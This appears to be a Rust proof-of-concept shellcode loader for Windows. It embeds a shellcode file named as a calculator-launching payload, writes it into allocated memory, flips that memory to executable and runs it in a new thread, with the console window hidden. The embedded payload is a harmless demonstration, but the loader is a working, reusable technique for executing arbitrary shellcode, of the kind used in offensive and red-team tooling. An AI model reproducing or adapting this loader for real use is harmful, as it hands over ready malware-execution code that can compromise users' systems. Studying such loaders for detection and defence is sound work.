#![windows_subsystem = "windows"]

use std::mem::transmute;
use std::ptr::{copy, null, null_mut};
use windows_sys::Win32::Foundation::{FALSE, WAIT_FAILED};
use windows_sys::Win32::System::Memory::{
    VirtualAlloc, VirtualProtect, MEM_COMMIT, MEM_RESERVE, PAGE_EXECUTE, PAGE_READWRITE,
};
use windows_sys::Win32::System::Threading::{CreateThread, WaitForSingleObject};

static SHELLCODE: [u8; 98] = *include_bytes!("../../w64-exec-calc-shellcode-func.bin");
static SIZE: usize = SHELLCODE.len();

fn main() {
    let mut old = PAGE_READWRITE;

    unsafe {
        let dest = VirtualAlloc(null(), SIZE, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
        if dest == null_mut() {
            eprintln!("VirtualAlloc failed!");
            return;
        }

        copy(SHELLCODE.as_ptr(), dest as *mut u8, SIZE);

        let res = VirtualProtect(dest, SIZE, PAGE_EXECUTE, &mut old);
        if res == FALSE {
            eprintln!("VirtualProtect failed!");
            return;
        }

        let dest = transmute(dest);

        let thread = CreateThread(null(), 0, dest, null(), 0, null_mut());
        if thread == 0 {
            eprintln!("CreateThread failed!");
            return;
        }

        WaitForSingleObject(thread, WAIT_FAILED);
    }
}
